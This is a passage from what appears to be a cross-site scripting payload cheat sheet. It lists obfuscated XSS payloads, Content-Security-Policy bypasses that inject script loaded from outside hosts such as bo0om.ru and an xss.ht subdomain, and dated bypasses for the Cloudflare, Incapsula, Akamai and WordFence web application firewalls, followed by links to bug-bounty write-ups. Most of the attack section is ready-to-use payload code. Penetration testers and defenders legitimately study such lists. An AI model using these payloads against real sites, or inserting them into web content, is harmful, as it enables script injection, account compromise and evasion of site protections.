<img/id="alert&lpar;&#x27;XSS&#x27;&#x29;\"/alt=\"/\"src=\"/\"onerror=eval(id&#x29;>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert&#40;&#39;1&#39;&#41</x>
<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
```

## CSP Bypass

Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://appio.dev/vulns/google-csp-evaluator/)

### Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))

//google.com/complete/search?client=chrome&jsonp=alert(1);

```js
<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
```

More JSONP endpoints available in [/Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)

### Bypass CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)

Works for CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`, [POC here](http://hsts.pro/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;)

```js
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
```

### Bypass CSP by [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)

```js
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://yoursubdomain.xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
```

### Bypass CSP by [@akita_zen](https://twitter.com/akita_zen)

Works for CSP like `script-src self`

```js
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

## Common WAF Bypass

### Cloudflare XSS Bypass - 22nd march 2019 (by @RakeshMane10)

```
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
```

### Cloudflare XSS Bypass - 27th february 2018

```html
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
```

### Chrome Auditor - 9th august 2018

```javascript
</script><svg><script>alert(1)-%26apos%3B
```

Live example by @brutelogic - [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c1=</script><svg><script>alert(1)-%26apos%3B)

### Incapsula WAF Bypass by [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)- 8th march 2018

```javascript
anythinglr00</script><script>alert(document.domain)</script>uxldz

anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
```

### Incapsula WAF Bypass by [@c0d3G33k](https://twitter.com/c0d3G33k) - 11th september 2018

```javascript
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```


### Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th june 2018

```javascript
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```

### Akamai WAF Bypass by [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480) - 28th october 2018

```html
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
```

### WordFence WAF Bypass by [@brutelogic](https://twitter.com/brutelogic) - 12th september 2018

```javascript
<a href=javas&#99;ript:alert(1)>
```

## More fun

This section will be used for the "fun/interesting/useless" stuff.

Use notification box instead of an alert - by [@brutelogic](https://twitter.com/brutelogic)
Note : it requires user permission

```javascript
Notification.requestPermission(x=>{new(Notification)(1)})
```

Try here : [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c3=%27;Notification.requestPermission(x=>%7Bnew(Notification)(1)%7D)//)

## References

- [Unleashing-an-Ultimate-XSS-Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
- tbm
- [(Relative Path Overwrite) RPO XSS - Infinite Security](http://infinite8security.blogspot.com/2016/02/welcome-readers-as-i-promised-this-post.html)
- [RPO TheSpanner](http://www.thespanner.co.uk/2014/03/21/rpo/)
- [RPO Gadget - innerthmtl](http://blog.innerht.ml/rpo-gadgets/)
- [Relative Path Overwrite - Detectify](http://support.detectify.com/customer/portal/articles/2088351-relative-path-overwrite)
- [XSS ghettoBypass - d3adend](http://d3adend.org/xss/ghettoBypass)
- [XSS without HTML: Client-Side Template Injection with AngularJS](http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html)
- [XSSING WEB PART - 2 - Rakesh Mane](http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html)
- [Making an XSS triggered by CSP bypass on Twitter. @tbmnull](https://medium.com/@tbmnull/making-an-xss-triggered-by-csp-bypass-on-twitter-561f107be3e5)
- [Ways to alert(document.domain) - @tomnomnom](https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309)
- [D1T1 - Michele Spagnuolo and Lukas Wilschelbaum - So We Broke All CSPs](https://conference.hitb.org/hitbsecconf2017ams/materials/D1T1%20-%20Michele%20Spagnuolo%20and%20Lukas%20Wilschelbaum%20-%20So%20We%20Broke%20All%20CSPS.pdf)
- [Sleeping stored Google XSS Awakens a $5000 Bounty](https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/) by Patrik Fehrenbach
- [RPO that lead to information leakage in Google](http://blog.innerht.ml/rpo-gadgets/) by filedescriptor
- [God-like XSS, Log-in, Log-out, Log-in](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/) in Uber by Jack Whitton 
- [Three Stored XSS in Facebook](http://www.breaksec.com/?p=6129) by Nirgoldshlager 
- [Using a Braun Shaver to Bypass XSS Audit and WAF](https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify) by Frans Rosen  
- [An XSS on Facebook via PNGs & Wonky Content Types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/) by Jack Whitton
  - he is able to make stored XSS from a irrelevant domain to main facebook domain 
- [Stored XSS in *.ebay.com](https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/) by Jack Whitton
- [Complicated, Best Report of Google XSS](https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss) by Ramzes
- [Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com](https://hackerone.com/reports/150179) by secgeek
- [Command Injection in Google Console](http://www.pranav-venkat.com/2016/03/command-injection-which-got-me-6000.html) by Venkat S
- [Facebook's Moves - OAuth XSS](http://www.paulosyibelo.com/2015/12/facebooks-moves-oauth-xss.html) by PAULOS YIBELO
- [Stored XSS in Google Docs (Bug Bounty)](http://hmgmakarovich.blogspot.hk/2015/11/stored-xss-in-google-docs-bug-bounty.html) by Harry M Gertos
- [Stored XSS on developer.uber.com via admin account compromise in Uber](https://hackerone.com/reports/152067) by James Kettle (albinowax)
- [Yahoo Mail stored XSS](https://klikki.fi/adv/yahoo.html) by Klikki Oy
- [Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212)](http://mksben.l0.cm/2016/07/xxn-caret.html) by Masato Kinugawa
- [Youtube XSS](https://labs.detectify.com/2015/06/06/google-xss-turkey/) by fransrosen
- [Best Google XSS again](https://sites.google.com/site/bughunteruniversity/best-reports/openredirectsthatmatter) - by Krzysztof Kotowicz
- [IE & Edge URL parsin Problem](https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/) - by detectify
- [Google XSS subdomain Clickjacking](http://sasi2103.blogspot.sg/2016/09/combination-of-techniques-lead-to-dom.html)
- [Microsoft XSS and Twitter XSS](http://blog.wesecureapp.com/xss-by-tossing-cookies/)
- [Google Japan Book XSS](http://nootropic.me/blog/en/blog/2016/09/20/%E3%82%84%E3%81%AF%E3%82%8A%E3%83%8D%E3%83%83%E3%83%88%E3%82%B5%E3%83%BC%E3%83%95%E3%82%A3%E3%83%B3%E3%82%92%E3%81%97%E3%81%A6%E3%81%84%E3%81%9F%E3%82%89%E3%81%9F%E3%81%BE%E3%81%9F%E3%81%BEgoogle/) 
- [Flash XSS mega nz](https://labs.detectify.com/2013/02/14/how-i-got-the-bug-bounty-for-mega-co-nz-xss/) - by frans
- [Flash XSS in multiple libraries](https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/) - by Olivier Beg
- [xss in google IE, Host Header Reflection](http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html)
- [Years ago Google xss](http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2%20-%20Itzhak%20Zuk%20Avraham%20and%20Nir%20Goldshlager%20-%20Killing%20a%20Bug%20Bounty%20Program%20-%20Twice.pdf)
- [xss in google by IE weird behavior](http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html)
- [xss in Yahoo Fantasy Sport](https://web.archive.org/web/20161228182923/http://dawgyg.com/2016/12/07/stored-xss-affecting-all-fantasy-sports-fantasysports-yahoo-com-2/)
- [xss in Yahoo Mail Again, worth $10000](https://klikki.fi/adv/yahoo2.html) by Klikki Oy
- [Sleeping XSS in Google](https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/) by securityguard
- [Decoding a .htpasswd to earn a payload of money](https://blog.it-securityguard.com/bugbounty-decoding-a-%F0%9F%98%B1-00000-htpasswd-bounty/) by securityguard
- [Google Account Takeover](http://www.orenh.com/2013/11/google-account-recovery-vulnerability.html#comment-form)
- [AirBnb Bug Bounty: Turning Self-XSS into Good-XSS #2](http://www.geekboy.ninja/blog/airbnb-bug-bounty-turning-self-xss-into-good-xss-2/) by geekboy
- [Uber Self XSS to Global XSS](https://httpsonly.blogspot.hk/2016/08/turning-self-xss-into-good-xss-v2.html)
- [How I found a $5,000 Google Maps XSS (by fiddling with Protobuf)](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g) by Marin MoulinierFollow
- [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/) by Brett 
- [XSSI, Client Side Brute Force](http://blog.intothesymmetry.com/2017/05/cross-origin-brute-forcing-of-saml-and.html)  
- [postMessage XSS Bypass](https://hackerone.com/reports/231053)
- [XSS in Uber via Cookie](http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/) by zhchbin
- [Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) by frans
- [XSS due to improper regex in third party js Uber 7k XSS](http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/) 
- [XSS in TinyMCE 2.4.0](https://hackerone.com/reports/262230) by Jelmer de Hen
- [Pass uncoded URL in IE11 to cause XSS](https://hackerone.com/reports/150179)
- [Twitter XSS by stopping redirection and javascript scheme](http://blog.blackfan.ru/2017/09/devtwittercom-xss.html) by Sergey Bobrov 
- [Auth DOM Uber XSS](http://stamone-bug-bounty.blogspot.hk/2017/10/dom-xss-auth_14.html)
- [Managed Apps and Music: two Google reflected XSSes](https://ysx.me.uk/managed-apps-and-music-a-tale-of-two-xsses-in-google-play/)
- [App Maker and Colaboratory: two Google stored XSSes](https://ysx.me.uk/app-maker-and-colaboratory-a-stored-google-xss-double-bill/)
- [XSS in www.yahoo.com](https://www.youtube.com/watch?v=d9UEVv3cJ0Q&feature=youtu.be) 
- [Stored XSS, and SSRF in Google using the Dataset Publishing Language](https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html)
- [Stored XSS on Snapchat](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
